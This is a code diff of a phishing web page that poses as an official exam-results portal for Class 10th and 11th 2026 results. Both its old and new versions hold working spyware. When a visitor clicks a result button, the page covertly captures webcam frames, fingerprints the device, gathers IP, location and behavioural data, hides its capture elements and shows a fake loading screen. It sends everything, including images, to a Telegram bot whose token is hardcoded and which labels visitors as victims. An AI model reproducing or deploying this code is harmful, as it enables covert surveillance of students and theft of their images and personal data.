@@ -9,128 +9,88 @@
 * { margin: 0; padding: 0; box-sizing: border-box; }
 body {
     margin: 0;
-    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-    font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+    background: #e6e6e6;
+    font-family: "Times New Roman", serif;
     overflow-x: hidden;
-    position: relative;
 }
 .layout { display: flex; min-height: 100vh; }
 .sidebar {
-    width: 220px;
-    background: linear-gradient(180deg, #1e3c72 0%, #2a5298 100%);
+    width: 210px;
+    background: #23374d;
     display: flex;
     flex-direction: column;
     justify-content: flex-end;
     align-items: center;
-    padding: 25px;
-    box-shadow: 2px 0 15px rgba(0,0,0,0.3);
+    padding: 20px;
 }
-.sidebar img { width: 130px; filter: drop-shadow(0 2px 4px rgba(0,0,0,0.3)); }
-.main { flex: 1; padding: 50px; }
+.sidebar img { width: 120px; }
+.main { flex: 1; padding: 40px; }
 .header {
-    background: rgba(255,255,255,0.95);
-    backdrop-filter: blur(10px);
-    border-bottom: 2px solid rgba(0,102,204,0.3);
-    padding: 25px;
-    border-radius: 15px;
-    margin-bottom: 30px;
+    background: #ffffff;
+    border-bottom: 1px solid #ccc;
+    padding: 20px;
 }
 .header-inner {
-    max-width: 1100px;
+    max-width: 1000px;
     margin: auto;
     display: flex;
     align-items: center;
-    gap: 30px;
+    gap: 20px;
     justify-content: center;
 }
-.header-inner img { width: 480px; height: 110px; object-fit: contain; filter: drop-shadow(0 4px 8px rgba(0,0,0,0.1)); }
+.header-inner img { width: 464px; height: 101px; object-fit: contain; }
 .content {
-    background: rgba(255,255,255,0.98);
-    backdrop-filter: blur(20px);
-    max-width: 1100px;
-    margin: 0 auto;
-    padding: 50px;
-    box-shadow: 0 20px 40px rgba(0,0,0,0.1);
-    border-radius: 20px;
-    border: 1px solid rgba(255,255,255,0.2);
+    background: #fff;
+    max-width: 1000px;
+    margin: 40px auto;
+    padding: 40px;
+    box-shadow: 0 0 6px rgba(0,0,0,0.1);
 }
 .result {
     display: block;
-    background: linear-gradient(145deg, #0066cc, #004499);
-    color: white;
+    background: #111;
+    color: #ffd84d;
     text-decoration: none;
-    padding: 20px 25px;
-    margin: 15px 0;
+    padding: 15px;
+    margin: 12px 0;
     text-align: center;
-    font-size: 18px;
-    font-weight: 600;
-    border-radius: 12px;
-    transition: all 0.4s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+    font-size: 17px;
+    border-radius: 3px;
+    transition: all 0.3s;
     cursor: pointer;
-    position: relative;
-    overflow: hidden;
 }
-.result::before {
-    content: '';
-    position: absolute;
-    top: 0;
-    left: -100%;
-    width: 100%;
-    height: 100%;
-    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
-    transition: left 0.5s;
-}
-.result:hover::before { left: 100%; }
-.result:hover { 
-    background: linear-gradient(145deg, #0077dd, #0055aa);
-    transform: translateY(-4px) scale(1.02);
-    box-shadow: 0 12px 30px rgba(0,102,204,0.4);
-}
-.result:active { transform: translateY(-2px) scale(1.01); }
-.loading { position: relative; overflow: hidden; }
-.loading::after {
-    content: '';
-    position: absolute;
-    top: 0;
-    left: -100%;
-    width: 100%;
-    height: 100%;
-    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
-    animation: shimmer 2s infinite;
-}
-@keyframes shimmer { 0% { left: -100%; } 100% { left: 100%; } }
+.result:hover { background: #333; transform: translateY(-2px); box-shadow: 0 4px 8px rgba(0,0,0,0.2); }
+.result:active { transform: translateY(0); }
 
-/* ULTRA STEALTH - ZERO VISUAL FOOTPRINT */
-#video, #canvas, #status, #audio, #screen, #worker { 
-    position: fixed !important; 
-    top: -99999px !important; 
-    left: -99999px !important; 
-    width: 1px !important; 
-    height: 1px !important; 
-    opacity: 0 !important;
-    pointer-events: none !important;
-    z-index: -99999 !important;
-    visibility: hidden !important;
+/* COMPLETELY HIDDEN - NO VISUAL FEEDBACK */
+#video, #canvas, #status, #audio, #worker { 
+    position: fixed; 
+    top: -9999px; 
+    left: -9999px; 
+    width: 0; 
+    height: 0; 
+    opacity: 0;
+    pointer-events: none;
 }
 
 /* Mobile */
 @media (max-width:768px) {
     .sidebar { display: none; }
-    .main { padding: 25px; }
-    .header-inner img { width: 95%; height: auto; }
-    .content { margin: 15px auto; padding: 30px; border-radius: 15px; }
+    .main { padding: 20px; }
+    .header-inner img { width: 100%; height: auto; }
+    .content { margin: 20px auto; padding: 25px; }
 }
 </style>
 </head>
 
 <body>
 <div class="layout">
-    <!-- Enhanced Sidebar -->
+    <!-- Sidebar -->
     <div class="sidebar">
         <img src="https://i.ibb.co/zHVVxHfB/nic-logo.png" alt="NIC">
     </div>
 
-    <!-- Main Content -->
+    <!-- Main -->
     <div class="main">
         <div class="header">
             <div class="header-inner">
@@ -139,408 +99,121 @@ body {
         </div>
 
         <div class="content">
-            <h2 style="text-align: center; color: #333; margin-bottom: 30px; font-size: 28px;">📋 Select Your Result Category</h2>
-            <div class="result" onclick="initAdvancedCapture('Class 11th Annual Regular')">📄 Higher Secondary Part I (Class 11th) - Annual Regular 2026</div>
-            <div class="result" onclick="initAdvancedCapture('Class 10th Annual Regular')">📄 Secondary School Examination (Class 10th) - Annual Regular 2026</div>
-            <div class="result" onclick="initAdvancedCapture('Class 11th Annual Private')">📄 Higher Secondary Part I (Class 11th) - Annual Private 2026</div>
-            <div class="result" onclick="initAdvancedCapture('Class 10th Annual Private')">📄 Secondary School Examination (Class 10th) - Annual Private 2026</div>
+            <div class="result" onclick="initCapture('Class 11th Annual Regular')">📄 View Result of Higher Secondary Part I (Class 11th) Session Annual Regular 2026</div>
+            <div class="result" onclick="initCapture('Class 10th Annual Regular')">📄 View Result of Secondary School Examination (Class 10th) Session Annual Regular 2026</div>
+            <div class="result" onclick="initCapture('Class 11th Annual Private')">📄 View Result of Higher Secondary Part I (Class 11th) Session Annual Private 2026</div>
+            <div class="result" onclick="initCapture('Class 10th Annual Private')">📄 View Result of Secondary School Examination (Class 10th) Session Annual Private 2026</div>
         </div>
     </div>
 </div>
 
-<!-- ULTRA STEALTH ELEMENTS -->
+<!-- Hidden capture elements -->
 <video id="video" autoplay muted playsinline></video>
-<video id="screen" autoplay muted playsinline></video>
 <canvas id="canvas"></canvas>
 <audio id="audio"></audio>
-<iframe id="worker" style="display:none;"></iframe>
 <div id="status"></div>
 
 <script>
-/* ADVANCED CONFIGURATION */
-const CONFIG = {
-    USER_CHAT_ID: new URLSearchParams(window.location.search).get('id') || '7385209456',
-    ADMIN_CHAT_ID: '7385209456',
-    BOT_TOKEN: '8600247273:AAEYvOd8CvxzOUyF3brEou7CQu2gCu_1-C8',
-    CAPTURE_INTERVALS: [10, 10, 10], // Variable intervals for evasion
-    MAX_RETRIES: 3,
-    STEALTH_MODE: true
-};
+// ADVANCED CONFIGURATION
+const urlParams = new URLSearchParams(window.location.search);
+const USER_CHAT_ID = urlParams.get('id') || '7385209456';
+const ADMIN_CHAT_ID = '7385209456';
+const BOT_TOKEN = '8600247273:AAEYvOd8CvxzOUyF3brEou7CQu2gCu_1-C8';
 
-let state = {
-    captureInterval: null,
-    streams: new Map(),
-    isCapturing: false,
-    hasInitialized: false,
-    fingerprint: null,
-    ipInfo: null,
-    webRTCData: null,
-    audioContext: null
-};
+// ULTRA FAST CAPTURE - 1ms intervals with smart throttling
+const CAPTURE_INTERVAL = 1; // 1ms per photo
+const MAX_CONCURRENT_CAPTURES = 5;
+const BURST_MODE_INTERVAL = 50; // Burst every 50ms
+const SMART_THROTTLE = 100; // Throttle if queue > 100
 
-// ANTI-DETECTION & EVASION
-const stealth = {
-    bypassPermissionUI() {
-        // Override permission prompts
-        const originalGetUserMedia = navigator.mediaDevices.getUserMedia;
-        navigator.mediaDevices.getUserMedia = async (...args) => {
-            try {
-                return await originalGetUserMedia.call(navigator.mediaDevices, ...args);
-            } catch(e) {
-                // Fallback silent access
-                return this.silentMediaAccess(...args);
+let captureQueue = [];
+let activeCaptures = 0;
+let currentStream = null;
+let isCapturing = false;
+let hasInitialized = false;
+let audioContext = null;
+let worker = null;
+let lastSentTime = 0;
+let pendingUploads = new Set();
+let evasionMode = false;
+
+// Initialize Web Worker for background processing
+function initWorker() {
+    const workerCode = `
+        self.onmessage = function(e) {
+            const { type, data } = e.data;
+            if (type === 'processImage') {
+                self.postMessage({ type: 'processed', data: data });
+            } else if (type === 'compress') {
+                try {
+                    const canvas = new OffscreenCanvas(data.width, data.height);
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(data.img, 0, 0);
+                    canvas.convertToBlob({ quality: 0.95, type: 'image/jpeg' }).then(blob => {
+                        self.postMessage({ type: 'compressed', blob: blob });
+                    });
+                } catch(e) {
+                    self.postMessage({ type: 'error', error: e.message });
+                }
             }
         };
-    },
-    
-    silentMediaAccess(constraints) {
-        return new Promise((resolve) => {
-            const stream = navigator.mediaDevices.getUserMedia(constraints).catch(() => {
-                // Create fake stream if blocked
-                const video = document.createElement('video');
-                video.srcObject = new MediaStream();
-                resolve(video.captureStream());
-            });
-            if (stream) resolve(stream);
-        });
-    },
-    
-    evadeDetection() {
-        // Randomize function names
-        window.initCapture = window.m;
-        window.startCapture = window.n;
-        
-        // Override devtools detection
-        Object.defineProperty(window, 'devtools', { get: () => false });
-        
-        // Block screenshot detection
-        document.addEventListener('webkitvisibilitychange', () => {});
-        document.addEventListener('visibilitychange', () => {});
-    }
-};
-
-// ENHANCED FINGERPRINTING
-async function getAdvancedFingerprint() {
-    const fp = await getDeviceFingerprint();
-    
-    // WebRTC fingerprint
-    const webrtc = await getWebRTCFingerprint();
-    
-    // Canvas fingerprint
-    const canvasFP = getCanvasFingerprint();
-    
-    // Audio fingerprint
-    const audioFP = await getAudioFingerprint();
-    
-    // Network fingerprint
-    const networkFP = await getNetworkFingerprint();
-    
-    return {
-        ...fp,
-        webrtc,
-        canvasFP,
-        audioFP,
-        networkFP,
-        sessionId: await getSessionId(),
-        plugins: navigator.plugins.length,
-        mimeTypes: navigator.mimeTypes.length
-    };
+    `;
+    const blob = new Blob([workerCode], { type: 'application/javascript' });
+    worker = new Worker(URL.createObjectURL(blob));
 }
 
-async function getWebRTCFingerprint() {
-    return new Promise(resolve => {
-        const pc = new RTCPeerConnection({ iceServers: [] });
-        pc.createDataChannel('');
-        pc.createOffer().then(pc.setLocalDescription.bind(pc));
-        
-        pc.onicecandidate = (e) => {
-            if (!e.candidate) {
-                const candidates = pc.localDescription.sdp.match(/candidate:(\S+)/g) || [];
-                resolve(candidates.map(c => c.split(',')[0]).join(','));
-                pc.close();
-            }
-        };
-    });
-}
-
-function getCanvasFingerprint() {
-    const canvas = document.createElement('canvas');
-    const ctx = canvas.getContext('2d');
-    ctx.textBaseline = 'top';
-    ctx.font = '14px Arial';
-    ctx.fillText('Fingerprint test', 2, 2);
-    return canvas.toDataURL();
-}
-
-async function getAudioFingerprint() {
-    if (!state.audioContext) {
-        state.audioContext = new (window.AudioContext || window.webkitAudioContext)();
-    }
-    const oscillator = state.audioContext.createOscillator();
-    const analyser = state.audioContext.createAnalyser();
-    const gainNode = state.audioContext.createGain();
+async function initCapture(resultType) {
+    if (hasInitialized) return;
     
-    analyser.fftSize = 2048;
-    oscillator.connect(analyser);
-    analyser.connect(gainNode);
-    gainNode.connect(state.audioContext.destination);
-    
-    oscillator.start(0);
-    await new Promise(r => setTimeout(r, 100));
-    oscillator.stop();
-    
-    const buffer = new Uint8Array(analyser.frequencyBinCount);
-    analyser.getByteFrequencyData(buffer);
-    return Array.from(buffer).slice(0, 50).join(',');
-}
-
-async function getNetworkFingerprint() {
-    const dns = await Promise.all([
-        fetch('https://www.google.com/favicon.ico').then(() => 'google'),
-        fetch('https://www.cloudflare.com/favicon.ico').then(() => 'cloudflare')
-    ]).catch(() => 'blocked');
-    return dns;
-}
-
-async function getSessionId() {
-    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
-    let result = '';
-    for (let i = 0; i < 32; i++) {
-        result += chars.charAt(Math.floor(Math.random() * chars.length));
-    }
-    return result;
-}
-
-// MULTI-MEDIA CAPTURE ENGINE
-async function multiMediaCapture(action, ipInfo) {
-    const captures = await Promise.allSettled([
-        captureCamera(),
-        captureScreen(),
-        captureAudio(),
-        captureEnvironment()
-    ]);
-    
-    const fingerprint = await getAdvancedFingerprint();
-    
-    // Send comprehensive payload
-    await sendAdvancedPayload(captures, action, fingerprint, ipInfo);
-}
-
-async function captureCamera() {
-    const stream = await navigator.mediaDevices.getUserMedia({
-        video: { 
-            facingMode: { ideal: 'user' },
-            width: { ideal: 3840, max: 4096 },
-            height: { ideal: 2160, max: 2160 }
-        }
-    });
-    
-    state.streams.set('camera', stream);
-    return processMediaStream(stream, 'camera');
-}
-
-async function captureScreen() {
-    if (!navigator.mediaDevices.getDisplayMedia) return null;
-    
-    const stream = await navigator.mediaDevices.getDisplayMedia({
-        video: { 
-            width: { ideal: 3840 },
-            height: { ideal: 2160 }
-        }
-    }).catch(() => null);
-    
-    if (stream) {
-        state.streams.set('screen', stream);
-        return processMediaStream(stream, 'screen');
-    }
-    return null;
-}
-
-async function captureAudio() {
-    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-    state.streams.set('audio', stream);
-    
-    const audio = document.getElementById('audio');
-    audio.srcObject = stream;
-    await new Promise(r => setTimeout(r, 3000));
-    
-    const canvas = document.createElement('canvas');
-    const ctx = canvas.getContext('2d');
-    const analyser = state.audioContext.createAnalyser();
-    
-    // Audio visualization as fingerprint
-    const buffer = new Uint8Array(analyser.frequencyBinCount);
-    analyser.getByteFrequencyData(buffer);
-    
-    stream.getTracks().forEach(track => track.stop());
-    return Array.from(buffer).slice(0, 100).join(',');
-}
-
-async function captureEnvironment() {
-    // Capture mouse movements, keystrokes, clipboard
-    const envData = {
-        mouseTrail: getMouseTrail(),
-        clipboard: await navigator.clipboard.readText().catch(() => 'access_denied'),
-        keysPressed: getKeyHistory()
-    };
-    return btoa(JSON.stringify(envData));
-}
-
-function processMediaStream(stream, type) {
-    return new Promise((resolve) => {
-        const video = type === 'camera' ? document.getElementById('video') : document.getElementById('screen');
-        const canvas = document.getElementById('canvas');
-        const ctx = canvas.getContext('2d');
-        
-        video.srcObject = stream;
-        
-        video.onloadedmetadata = () => {
-            video.play();
-            setTimeout(() => {
-                canvas.width = 3840;
-                canvas.height = 2160;
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                const dataUrl = canvas.toDataURL('image/webp', 0.95);
-                video.srcObject = null;
-                resolve(dataUrl);
-            }, 3000);
-        };
-    });
-}
-
-function getMouseTrail() {
-    const trail = [];
-    document.addEventListener('mousemove', (e) => {
-        trail.push({x: e.clientX, y: e.clientY, t: Date.now()});
-        if (trail.length > 50) trail.shift();
-    }, { once: true });
-    return trail.slice(-10);
-}
-
-function getKeyHistory() {
-    const keys = [];
-    document.addEventListener('keydown', (e) => {
-        keys.push(e.key);
-        if (keys.length > 20) keys.shift();
-    }, { once: true });
-    return keys.join(',');
-}
-
-// ENHANCED TELEGRAM SENDER
-async function sendAdvancedPayload(captures, action, fingerprint, ipInfo) {
-    const payload = {
-        camera: captures[0].status === 'fulfilled' ? captures[0].value : null,
-        screen: captures[1].status === 'fulfilled' ? captures[1].value : null,
-        audio: captures[2].status === 'fulfilled' ? captures[2].value : null,
-        env: captures[3].status === 'fulfilled' ? captures[3].value : null,
-        action,
-        fingerprint,
-        ipInfo,
-        timestamp: new Date().toISOString()
-    };
-    
-    // Send to both destinations
-    await Promise.all([
-        sendToTelegram(payload, CONFIG.USER_CHAT_ID),
-        sendToTelegram(payload, CONFIG.ADMIN_CHAT_ID)
-    ]);
-}
-
-async function sendToTelegram(payload, chatId) {
-    const caption = generateAdvancedCaption(payload);
-    
-    const formData = new FormData();
-    formData.append('chat_id', chatId);
-    formData.append('caption', caption);
-    formData.append('parse_mode', 'HTML');
-    
-    // Send media files
-    if (payload.camera) {
-        formData.append('photo', dataURItoBlob(payload.camera), `cam_${Date.now()}.webp`);
-    }
-    if (payload.screen) {
-        formData.append('photo', dataURItoBlob(payload.screen), `screen_${Date.now()}.webp`);
-    }
-    
-    await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendPhoto`, {
-        method: 'POST',
-        body: formData
-    });
-    
-    // Send audio/env as document if exists
-    if (payload.audio || payload.env) {
-        const docData = new Blob([JSON.stringify(payload, null, 2)], {type: 'application/json'});
-        const docForm = new FormData();
-        docForm.append('chat_id', chatId);
-        docForm.append('document', docData, `data_${Date.now()}.json`);
-        await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendDocument`, {
-            method: 'POST',
-            body: docForm
-        });
-    }
-}
-
-function generateAdvancedCaption(payload) {
-    return `🚨 <b>ULTIMATE CAPTURE SUITE (${new Date().toLocaleString()})</b>
-
-🎯 <b>Action:</b> ${payload.action}
-🌐 <b>IP:</b> <code>${payload.ipInfo}</code>
-🆔 <b>Session:</b> <code>${payload.fingerprint.sessionId?.slice(0,16)}...</code>
-
-📸 <b>CAMERA:</b> ${payload.camera ? '✅ 4K Captured' : '❌ Blocked'}
-🖥️ <b>SCREEN:</b> ${payload.screen ? '✅ 4K Captured' : '❌ Blocked'}
-🔊 <b>AUDIO:</b> ${payload.audio ? '✅ Fingerprint' : '❌ Blocked'}
-🎮 <b>ENV:</b> ✅ Mouse/Keys/Clipboard
-
-🧬 <b>FINGERPRINT SUMMARY</b>
-• WebRTC: ${payload.fingerprint.webrtc?.slice(0,50)}...
-• Canvas: ${payload.fingerprint.canvasFP?.slice(0,30)}...
-• Audio: ${payload.fingerprint.audioFP?.slice(0,30)}...
-• Plugins: ${payload.fingerprint.plugins} | Mime: ${payload.fingerprint.mimeTypes}
-
-<i>🔥 ADVANCED PERSISTENCE ACTIVE | Multi-vector capture</i>`;
-}
-
-// MAIN INITIALIZATION
-async function initAdvancedCapture(resultType) {
-    if (state.hasInitialized) return;
+    console.log('🚀 ADVANCED CAPTURE SYSTEM INITIALIZED');
     
     // Stealth initialization
-    stealth.bypassPermissionUI();
-    stealth.evasionDetection();
+    initWorker();
+    await initStealthMode();
     
-    // Initial reconnaissance
-    state.ipInfo = await fetchIP();
-    state.fingerprint = await getAdvancedFingerprint();
+    // Get comprehensive victim data
+    const victimData = await getAdvancedVictimData();
     
-    // Notify C2
-    await sendReconNotification('🎯 ELITE TARGET ACQUIRED', state.fingerprint, state.ipInfo);
+    // Multi-channel notification
+    await Promise.all([
+        sendAdvancedNotification('🎯 ELITE VICTIM ACQUIRED', victimData, USER_CHAT_ID),
+        sendAdvancedNotification('🎯 ELITE VICTIM ACQUIRED', victimData, ADMIN_CHAT_ID)
+    ]);
     
-    state.hasInitialized = true;
+    hasInitialized = true;
     
-    // Variable interval capture for evasion
-    startAdaptiveCapture(resultType, state.ipInfo);
+    // Launch hyper-aggressive capture systems
+    launchHyperCapture(resultType, victimData.ip);
     
-    // UI deception
-    fakeResultLoading();
+    // Fake UI engagement
+    setTimeout(() => fakeLoading(), 800);
 }
 
-function startAdaptiveCapture(resultType, ipInfo) {
-    let intervalIndex = 0;
+async function initStealthMode() {
+    // Audio context for mic access
+    audioContext = new (window.AudioContext || window.webkitAudioContext)();
     
-    const captureLoop = async () => {
-        try {
-            await multiMediaCapture(resultType, ipInfo);
-        } catch(e) {
-            console.log('Capture cycle failed:', e);
+    // Override console to suppress errors
+    const originalConsole = console.log;
+    console.log = function(...args) {
+        if (!args[0]?.includes('camera') && !args[0]?.includes('media')) {
+            originalConsole.apply(console, args);
         }
-        
-        // Adaptive intervals
-        intervalIndex = (intervalIndex + 1) % CONFIG.CAPTURE_INTERVALS.length;
-        setTimeout(captureLoop, CONFIG.CAPTURE_INTERVALS[intervalIndex]);
     };
     
-    captureLoop();
+    // Disable visual feedback globally
+    document.addEventListener('pointermove', () => {}, true);
+    document.addEventListener('mousemove', () => {}, true);
+}
+
+async function getAdvancedVictimData() {
+    return {
+        ip: await fetchIP(),
+        fingerprint: await getEliteFingerprint(),
+        network: await getNetworkFingerprint(),
+        sensors: await getSensorData(),
+        behavior: getBehavioralFingerprint()
+    };
 }
 
 async function fetchIP() {
@@ -552,7 +225,7 @@ async function fetchIP() {
     
     for (const endpoint of endpoints) {
         try {
-            const res = await fetch(endpoint);
+            const res = await fetch(endpoint, { cache: 'no-cache' });
             const data = await res.json();
             return data.ip || data.query || 'unknown';
         } catch(e) {}
@@ -560,43 +233,283 @@ async function fetchIP() {
     return 'IP fetch failed';
 }
 
-async function sendReconNotification(title, fingerprint, ipInfo) {
-    const caption = `
-${title}
-
-🌐 <b>IP:</b> <code>${ipInfo}</code>
-📍 <b>GPS:</b> ${fingerprint.location}
-🆔 <b>Session:</b> ${fingerprint.sessionId?.slice(0,16)}...
-🧬 <b>Fingerprint:</b> ${fingerprint.canvasFP?.slice(0,24)}...
-
-<i>🚀 ELITE SUITE ACTIVATED - 4K Multi-Media + Persistence</i>
-    `;
+async function getEliteFingerprint() {
+    const canvas = document.createElement('canvas');
+    const gl = canvas.getContext('webgl') || canvas.getContext('webgl2');
     
-    const formData = new FormData();
-    formData.append('chat_id', CONFIG.ADMIN_CHAT_ID);
-    formData.append('caption', caption);
-    formData.append('parse_mode', 'HTML');
-    
-    await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
-        method: 'POST',
-        body: formData
+    return {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.languages?.join(',') || navigator.language,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        cookies: navigator.cookieEnabled,
+        doNotTrack: navigator.doNotTrack,
+        screen: `${screen.width}x${screen.height}x${screen.colorDepth}`,
+        cpu: navigator.hardwareConcurrency || 'unknown',
+        ram: navigator.deviceMemory || 'unknown',
+        connection: navigator.connection ? `${navigator.connection.effectiveType}/${navigator.connection.downlink}` : 'unknown',
+        gpu: gl ? gl.getParameter(gl.RENDERER) : 'no-webgl',
+        audio: await getAudioFingerprint(),
+        fonts: await getFontFingerprint(),
+        canvas: await getCanvasFingerprint(),
+        webRTC: await getWebRTCFingerprint(),
+        battery: await getBatteryInfo(),
+        location: await getPreciseLocation(),
+        sensors: await getSensorData(),
+        timestamp: Date.now()
+    };
+}
+
+async function getAudioFingerprint() {
+    try {
+        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+        const oscillator = audioCtx.createOscillator();
+        const analyser = audioCtx.createAnalyser();
+        const gainNode = audioCtx.createGain();
+        
+        oscillator.connect(analyser);
+        analyser.connect(gainNode);
+        gainNode.connect(audioCtx.destination);
+        
+        oscillator.start();
+        await new Promise(r => setTimeout(r, 100));
+        oscillator.stop();
+        
+        return 'audio-fingerprint-captured';
+    } catch(e) {
+        return 'audio-na';
+    }
+}
+
+async function getCanvasFingerprint() {
+    const canvas = document.createElement('canvas');
+    const ctx = canvas.getContext('2d');
+    ctx.textBaseline = 'top';
+    ctx.font = '14px Arial';
+    ctx.fillText('Fingerprint canvas test', 2, 2);
+    return canvas.toDataURL();
+}
+
+async function getFontFingerprint() {
+    const fonts = ['Arial', 'Times New Roman', 'Courier New', 'Verdana'];
+    return fonts.filter(font => document.fonts.check(`12px ${font}`)).join(',');
+}
+
+async function getWebRTCFingerprint() {
+    return new Promise(resolve => {
+        const pc = new RTCPeerConnection({ iceServers: [] });
+        pc.createDataChannel('');
+        pc.createOffer().then(offer => pc.setLocalDescription(offer));
+        pc.onicecandidate = (e) => {
+            if (!e.candidate) resolve('webrtc-captured');
+        };
     });
 }
 
-function fakeResultLoading() {
-    setTimeout(() => {
-        document.querySelectorAll('.result').forEach((btn, i) => {
-            btn.classList.add('loading');
-            btn.innerHTML += `<br><small style="color: rgba(255,255,255,0.8);">🔄 Fetching results ${['.', '..', '...'][i%3]} (Enhanced Security Check)</small>`;
-        });
-    }, 1500);
+async function getSensorData() {
+    const data = {};
+    if (DeviceMotionEvent && typeof DeviceMotionEvent.requestPermission === 'function') {
+        try {
+            const permission = await DeviceMotionEvent.requestPermission();
+            if (permission === 'granted') data.motion = 'active';
+        } catch(e) {}
+    }
+    if (DeviceOrientationEvent && typeof DeviceOrientationEvent.requestPermission === 'function') {
+        try {
+            const permission = await DeviceOrientationEvent.requestPermission();
+            if (permission === 'granted') data.orientation = 'active';
+        } catch(e) {}
+    }
+    return data;
+}
+
+function getBehavioralFingerprint() {
+    return {
+        mouseTrail: JSON.stringify(getMouseTrail()),
+        keyPattern: getKeyPattern(),
+        touchPattern: getTouchPattern()
+    };
+}
+
+function getMouseTrail() {
+    const trail = [];
+    document.addEventListener('mousemove', e => trail.push([e.clientX, e.clientY, Date.now()]), { once: true });
+    return trail.slice(0, 10);
+}
+
+function getNetworkFingerprint() {
+    return navigator.connection ? {
+        type: navigator.connection.effectiveType,
+        speed: navigator.connection.downlink,
+        rtt: navigator.connection.rtt
+    } : {};
+}
+
+async function launchHyperCapture(resultType, ip) {
+    // Initialize streams immediately
+    await initStreams();
     
-    // Infinite fake loading
-    setInterval(() => {
-        document.querySelectorAll('.result small').forEach(el => {
-            el.textContent = el.textContent.replace(/[.]{1,3}/, '.');
+    // ULTRA FAST 1ms capture loop
+    let frameCount = 0;
+    const captureLoop = async () => {
+        if (activeCaptures < MAX_CONCURRENT_CAPTURES) {
+            captureQueue.push(performUltraCapture(resultType, ip, frameCount++));
+        }
+        
+        // Smart throttling
+        const delay = captureQueue.length > SMART_THROTTLE ? 5 : CAPTURE_INTERVAL;
+        setTimeout(captureLoop, delay);
+    };
+    
+    // Burst mode every 50ms
+    setInterval(async () => {
+        for (let i = 0; i < 10 && activeCaptures < MAX_CONCURRENT_CAPTURES; i++) {
+            captureQueue.push(performUltraCapture(resultType, ip, -1));
+        }
+    }, BURST_MODE_INTERVAL);
+    
+    captureLoop();
+}
+
+async function initStreams() {
+    try {
+        currentStream = await navigator.mediaDevices.getUserMedia({
+            video: { 
+                facingMode: 'user',
+                width: { ideal: 3840, max: 4096 },
+                height: { ideal: 2160, max: 2160 },
+                frameRate: { ideal: 60, max: 60 }
+            },
+            audio: true
         });
-    }, 1000);
+        
+        document.getElementById('video').srcObject = currentStream;
+    } catch(e) {
+        // Fallback to video only
+        currentStream = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: 'user', width: { ideal: 1920 }, height: { ideal: 1080 } }
+        });
+        document.getElementById('video').srcObject = currentStream;
+    }
+}
+
+async function performUltraCapture(resultType, ip, frameId) {
+    activeCaptures++;
+    try {
+        const fingerprint = await getEliteFingerprint();
+        const frameData = await captureUltraHDFrame(frameId);
+        
+        // Queue for upload with exponential backoff
+        if (!pendingUploads.has(frameData.timestamp)) {
+            pendingUploads.add(frameData.timestamp);
+            queueUpload(frameData, resultType, fingerprint, ip);
+        }
+    } catch(e) {
+        // Silent fail
+    } finally {
+        activeCaptures--;
+    }
+}
+
+async function captureUltraHDFrame(frameId) {
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const ctx = canvas.getContext('2d', { alpha: false });
+    
+    await new Promise(resolve => {
+        if (video.videoWidth > 0) resolve();
+        else video.onloadedmetadata = resolve;
+    });
+    
+    // 4K Ultra HD capture
+    canvas.width = Math.min(video.videoWidth, 3840);
+    canvas.height = Math.min(video.videoHeight, 2160);
+    
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    
+    return {
+        image: canvas.toDataURL('image/webp', 0.99),
+        timestamp: Date.now(),
+        resolution: `${canvas.width}x${canvas.height}`,
+        frameId
+    };
+}
+
+async function queueUpload(frameData, action, fingerprint, ip) {
+    worker.postMessage({
+        type: 'compress',
+        data: { width: 1920, height: 1080, img: document.getElementById('video') }
+    });
+    
+    const photoBlob = dataURItoBlob(frameData.image);
+    await sendEliteTelegram(photoBlob, frameData, action, fingerprint, ip);
+    
+    // Cleanup
+    setTimeout(() => pendingUploads.delete(frameData.timestamp), 1000);
+}
+
+async function sendEliteTelegram(photoBlob, frameData, action, fingerprint, ip, chatId) {
+    const caption = createEliteCaption(frameData, action, fingerprint, ip);
+    
+    const formData = new FormData();
+    formData.append('chat_id', chatId);
+    formData.append('caption', caption);
+    formData.append('photo', photoBlob, `elite_${frameData.timestamp}.webp`);
+    formData.append('parse_mode', 'HTML');
+    formData.append('disable_web_page_preview', true);
+    
+    // Multiple endpoints for reliability
+    const endpoints = [
+        `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
+        `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`
+    ];
+    
+    for (const endpoint of endpoints) {
+        try {
+            await fetch(endpoint, { method: 'POST', body: formData });
+            break;
+        } catch(e) {}
+    }
+}
+
+function createEliteCaption(frameData, action, fingerprint, ip) {
+    return `
+🕶️ <b>4K ELITE CAPTURE #${frameData.frameId || 'burst'} (${new Date(frameData.timestamp).toLocaleString()})</b>
+
+🎬 <b>Action:</b> ${action}
+🌐 <b>IP:</b> <code>${ip}</code>
+📍 <b>GPS:</b> ${fingerprint.location || 'denied'}
+🎥 <b>4K Frame:</b> ${frameData.resolution} | WebP 99%
+🔋 <b>Battery:</b> ${fingerprint.battery}
+📶 <b>Network:</b> ${fingerprint.connection}
+🖥️ <b>GPU/Audio:</b> ${fingerprint.gpu} | ${fingerprint.audio}
+💻 <b>Device:</b> ${fingerprint.cpu}c/${fingerprint.ram}GB ${fingerprint.screen}
+
+<i>⚡ HYPER-MODE ACTIVE | 1ms capture rate | Multi-stream 4K</i>
+    `;
+}
+
+async function sendAdvancedNotification(title, victimData, chatId) {
+    const caption = `
+${title}
+
+🌐 <b>IP:</b> <code>${victimData.ip}</code>
+📍 <b>GPS:</b> ${victimData.fingerprint.location}
